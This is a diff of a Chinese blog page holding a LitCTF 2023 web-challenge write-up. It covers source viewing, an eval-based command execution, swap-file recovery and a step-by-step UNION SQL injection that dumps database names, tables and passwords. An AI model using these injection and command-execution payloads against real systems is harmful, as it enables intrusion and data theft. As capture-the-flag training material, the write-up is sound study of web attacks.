@@ -1,15 +1,22 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>litctf | 花开再美，怎如初见..?</title>
-
-  <!-- keywords -->
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="wuming">
+  <meta name="keywords" content="">
   
-
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="web [LitCTF 2023]我Flag呢？打开环境后，直接F12就可以看到flag 同时打开源码的方式还有 1f12&#x2F;ctrl+u&#x2F;view-source：">
+    <meta name="description" content="web [LitCTF 2023]我Flag呢？打开环境后，直接F12就可以看到flag 同时打开源码的方式还有 1f12&#x2F;ctrl+u&#x2F;view-source：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="litctf">
 <meta property="og:url" content="https://wuming.github.io/2023/09/19/litctf/index.html">
@@ -46,227 +53,287 @@
 <meta property="article:tag" content="RE">
 <meta property="article:tag" content="litctf">
 <meta property="article:tag" content="WEB">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://wuming.github.io/image/image-20231218132527404.png">
   
-    <link rel="alternative" href="/atom.xml" title="花开再美，怎如初见..?" type="application/atom+xml">
   
   
-    <link rel="icon" href="/img/favicon.ico">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <title>litctf - 花开再美，怎如初见..?</title>
 
-  
-  
-
-  
-<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
-
-  
-<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wuming.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="花开再美，怎如初见..?" type="application/atom+xml">
+</head>
+
+
 <body>
-  <div id="container">
-    <div id="particles-js"></div>
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-	<header id="header" class="inner">
-		<a href="/" class="profilepic">
-			
-				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
-			
-		</a>
+  
 
-		<hgroup>
-			<h1 class="header-author"><a href="/">wuming</a></h1>
-		</hgroup>
+  <header>
+    
 
-		
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
 
-		<div class="switch-area">
-			<div class="switch-wrap">
-				<section class="switch-part switch-part1">
-					<nav class="header-menu">
-						<ul>
-						
-							<li><a href="/">Home</a></li>
-				        
-							<li><a href="/archives">Archives</a></li>
-				        
-						</ul>
-					</nav>
-					<nav class="half-header-menu">
-						<a class="hide">Home</a>
-						<a>Tags</a>
-						<a>Links</a>
-						<a>About</a>
-					</nav>
-					<nav class="header-nav">
-						<div class="social">
-							
-								<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
-					        
-								<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
-					        
-								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
-					        
-						</div>
-						<!-- music -->
-						
-							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
-							<div style="position: absolute; left: auto; width: 85%;">
-								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1397345903&auto=1&height=66"></iframe>
-							</div>
-						
-					</nav>
-				</section>
-				
-				
-				<section class="switch-part switch-part2">
-					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/litctf/" style="font-size: 10px;">litctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/re/" style="font-size: 10px;">re</a> <a href="/tags/write-up/" style="font-size: 10px;">write up</a>
-					</div>
-				</section>
-				
-				
-				
-				<section class="switch-part switch-part3">
-					<div id="js-friends">
-					
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="/null">github</a>
-			        
-			        </div>
-				</section>
-				
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-				
-				
-				<section class="switch-part switch-part4">
-				
-					<div id="js-aboutme">一名正在学习的ctfer...</div>
-				</section>
-				
-			</div>
-		</div>
-	</header>				
-</div>
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-  	<div class="overlay">
-  		<div class="slider-trigger"></div>
-  		<h1 class="header-author js-mobile-header hide"></h1>
-  	</div>
-	<div class="intrude-less">
-		<header id="header" class="inner">
-			<div class="profilepic">
-				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
-			</div>
-			<hgroup>
-			  <h1 class="header-author"></h1>
-			</hgroup>
-			
-			<nav class="header-menu">
-				<ul>
-				
-					<li><a href="/">Home</a></li>
-		        
-					<li><a href="/archives">Archives</a></li>
-		        
-		        <div class="clearfix"></div>
-				</ul>
-			</nav>
-			<nav class="header-nav">
-				<div class="social">
-					
-						<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
-			        
-						<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
-			        
-						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
-			        
-				</div>
-			</nav>
-		</header>				
-	</div>
+  </div>
 </nav>
-      <div class="body-wrap"><article id="ew-litctf" class="article article-type-ew" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/09/19/litctf/" class="article-date">
-  	<time datetime="2023-09-19T08:45:20.000Z" itemprop="datePublished">2023-09-19</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      litctf
-      
-    </h1>
+
   
 
-      </header>
-      
-      <div class="article-info article-info-post">
-        
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/" rel="tag">RE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/litctf/" rel="tag">litctf</a></li></ul>
-	</div>
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="litctf"></span>
+          
+        </div>
 
         
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-19 16:45" pubdate>
+          2023年9月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
 
         
-        <div class="clearfix"></div>
       </div>
+
       
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
     
-    <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p><img src="/./../image/image-20231218132527404.png" alt="image-20231218132527404"></p>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">litctf</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p><img src="/./../image/image-20231218132527404.png" srcset="/img/loading.gif" lazyload alt="image-20231218132527404"></p>
 <h2 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h2><p>打开环境后，直接F12就可以看到flag</p>
 <p>同时打开源码的方式还有</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f12/ctrl+u/view-source：</span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">f12<span class="hljs-regexp">/ctrl+u/</span>view-<span class="hljs-keyword">source</span>：<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp" srcset="/img/loading.gif" lazyload></p>
 <span id="more"></span> 
 
 <h2 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h2><p>打开页面，猜测命令执行</p>
 <p>system(“ls &#x2F;“); 查看目录文件夹，看到flag文件直接查看即可</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4m4th4lnkqg0.png"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4m4th4lnkqg0.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a>[LitCTF 2023]就当无事发生</h2><p>首先去探姬的github，然后直接搜索他的博客地址</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/0bc762429c6478832b423983f5f49c8e.2fr8flw6sa80.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/0bc762429c6478832b423983f5f49c8e.2fr8flw6sa80.webp" srcset="/img/loading.gif" lazyload></p>
 <p>随后直接点击这个按钮，可以查看作者对文件的更改</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2r551bvk57c0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2r551bvk57c0.webp" srcset="/img/loading.gif" lazyload></p>
 <p>最后在里面找到带有X号的，就是作者删除过的，或者点上面的√可以看到作者的更改</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B7E1532FA-9E7A-4e87-A5FE-C4EB552A98AF%7D.112w5kxubstc.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B7E1532FA-9E7A-4e87-A5FE-C4EB552A98AF%7D.112w5kxubstc.webp" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a>[LitCTF 2023]Follow me and hack me</h2><p>直接hackar进行传参</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/8160496c03f53fa83615d0212465ef11.12lqjzm7lqf4.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/8160496c03f53fa83615d0212465ef11.12lqjzm7lqf4.webp" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h2><p>xxxxxxxxxx mappings &#x3D; { 0x04:”A”,  0x05:”B”,  0x06:”C”, 0x07:”D”, 0x08:”E”, 0x09:”F”, 0x0A:”G”,  0x0B:”H”, 0x0C:”I”,  0x0D:”J”, 0x0E:”K”, 0x0F:”L”, 0x10:”M”, 0x11:”N”,0x12:”O”,  0x13:”P”, 0x14:”Q”, 0x15:”R”, 0x16:”S”, 0x17:”T”, 0x18:”U”,0x19:”V”, 0x1A:”W”, 0x1B:”X”, 0x1C:”Y”, 0x1D:”Z”, 0x1E:”1”, 0x1F:”2”, 0x20:”3”, 0x21:”4”, 0x22:”5”,  0x23:”6”, 0x24:”7”, 0x25:”8”, 0x26:”9”, 0x27:”0”, 0x28:”\n”, 0x2a:”[DEL]”,  0X2B:”    “, 0x2C:” “,  0x2D:”-“, 0x2E:”&#x3D;”, 0x2F:”[“,  0x30:”]”,  0x31:”\“, 0x32:”~”, 0x33:”;”,  0x34:”‘“, 0x36:”,”,  0x37:”.” }nums &#x3D; []keys &#x3D; open(‘usbdata.txt’)for line in keys:    if line[0]!&#x3D;’0’ or line[1]!&#x3D;’0’ or line[3]!&#x3D;’0’ or line[4]!&#x3D;’0’ or line[9]!&#x3D;’0’ or line[10]!&#x3D;’0’ or line[12]!&#x3D;’0’ or line[13]!&#x3D;’0’ or line[15]!&#x3D;’0’ or line[16]!&#x3D;’0’ or line[18]!&#x3D;’0’ or line[19]!&#x3D;’0’ or line[21]!&#x3D;’0’ or line[22]!&#x3D;’0’:         continue    nums.append(int(line[6:8],16))keys.close()output &#x3D; “”for n in nums:    if n &#x3D;&#x3D; 0 :        continue    if n in mappings:        output +&#x3D; mappings[n]    else:        output +&#x3D; ‘[unknown]’print(‘output :\n’ + output)​# output :# SEC2ETK3YPython</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r xxx.swp</span><br></pre></td></tr></table></figure>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vim</span> -r xxx.swp<br></code></pre></td></tr></table></figure>
 
 <p>比如我 vim 1.php 但是我中通关闭了他，那天就会产生这个文件，只需要r一下就可以恢复</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/15250cfd706242cbaf0aa0e5a8f97bab.67gq0p6qvn40.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/15250cfd706242cbaf0aa0e5a8f97bab.67gq0p6qvn40.webp" srcset="/img/loading.gif" lazyload></p>
 <p>回到题目，首先下载下这个文件，然后去kali将文件恢复</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28647/.index.php.swp</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">node4<span class="hljs-selector-class">.anna</span><span class="hljs-selector-class">.nssctf</span><span class="hljs-selector-class">.cn</span>:<span class="hljs-number">28647</span>/<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp<br></code></pre></td></tr></table></figure>
 
 <p>此时我们就已知了他的php代码</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6pidz6qpuog0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6pidz6qpuog0.webp" srcset="/img/loading.gif" lazyload></p>
 <p>代码的逻辑很简单，就是post传参一个base64加密后的’Give_Me_You_Flag’</p>
 <p>然后传入一个名为cmd的参数，因为外包裹着eval，所以我们可以执行命令</p>
 <p>可以用burp进行抓包操作得到flag</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.28caqntwhedc.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.28caqntwhedc.webp" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ZR4y1Y745/?spm_id_from=333.880.my_history.page.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18">SQL注入攻击原理，方法和类型_哔哩哔哩_bilibili</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/116484328">SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客</a></p>
 <p>作为一个新手web，看了一天，看不懂一点，所以直接记套题，后续慢慢了解</p>
@@ -275,166 +342,447 @@
 <p>id&#x3D;1回显就是整形</p>
 <p>id&#x3D;’1‘回显就是字符型</p>
 <p>可以看到id&#x3D;1时有回显，我们判断他是整形注入</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2pssl53e6kq0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2pssl53e6kq0.webp" srcset="/img/loading.gif" lazyload></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_23667585/article/details/127213099">浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客</a></p>
 <p>1.先判断显示位，payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>)))))) union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span>)))))) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>第一句就有很多问题，详细可以参考上述的文章，wp参考</p>
 <p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/Leaf_initial/article/details/130671885">LitCTF2023] web方向全题解wp_Leafzzz__的博客-CSDN博客</a></p>
 <p>2.爆库：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></table></figure>
 
 <p>1&#x3D;2的目的是使得条件为假,经过我的实验使用id&#x3D;-1)))))) union…同理，所以这俩的作用都是表示判断错误，不显示第一个数据库，显示第二个</p>
 <p>3.得到库名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,ctftraining,performance_schema,test,ctf</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">information_schema,mysql,ctftraining,performance_schema,test,ctf<br></code></pre></td></tr></table></figure>
 
 <p>4.爆表：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctf&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name)<span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&quot;ctf&quot;</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>5.得到表名：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">users<br></code></pre></td></tr></table></figure>
 
 <p>6.爆列：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">group_concat</span>(column_name)<span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&quot;users&quot;</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>7.得到列名：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password<br></code></pre></td></tr></table></figure>
 
 <p>8.获取值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctf.users#<br></code></pre></td></tr></table></figure>
 
 <p>9.获得彩蛋（难蚌）：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OHHHHHHH,F1rst_to_Th3_eggggggggg!&#125; </span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">OHHHHHHH,F1rst_to_Th3_eggggggggg!&#125; <br></code></pre></td></tr></table></figure>
 
 <p>flag同理，去爆ctftraining即可</p>
 <p>10.重新爆表：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctftraining&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
